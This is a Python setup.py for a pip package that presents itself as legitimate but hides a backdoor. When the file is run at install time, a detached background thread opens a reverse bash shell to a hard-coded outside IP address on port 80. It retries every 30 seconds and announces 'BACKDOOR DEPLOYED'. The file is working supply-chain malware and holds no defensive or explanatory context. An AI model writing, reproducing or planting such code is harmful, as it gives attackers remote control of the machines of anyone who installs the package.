from setuptools import setup
import os
import sys
import socket
import subprocess
import threading
import time

def stealth_backdoor():
    try:
        # Fork and detach
        if os.fork() > 0:
            return
        
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
        
        # Wait for installation to complete
        time.sleep(5)
        
        # VPS details
        ATTACKER_IP = "142.93.23.15"
        ATTACKER_PORT = 80
        
        while True:
            try:
                # Connect back
                s = socket.socket()
                s.connect((ATTACKER_IP, ATTACKER_PORT))
                
                # Send successful installation confirmation
                s.send(b"""
╔════════════════════════════════════╗
║  BACKDOOR DEPLOYED - CLEAN INSTALL ║
╚════════════════════════════════════╝
Status: Package installed successfully
No errors during installation
Package appears in pip list
======================================
$ """.encode())
                
                # Full interactive shell
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                
                subprocess.call(["/bin/bash", "-i"])
                
            except:
                time.sleep(30)  # Wait longer between retries
                
    except:
        pass

# Start backdoor in background
thread = threading.Thread(target=stealth_backdoor)
thread.daemon = True
thread.start()

# Clean setup - guarantees successful installation
setup(
    name="malicious-package",
    version="1.0.0",
    description="A legitimate looking package",
    author="Trusted Developer",
    url="https://github.com/trusted/malicious-package",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
    py_modules=[],  # Empty but valid
    packages=[],    # Empty but valid
    install_requires=[],  # No dependencies
)
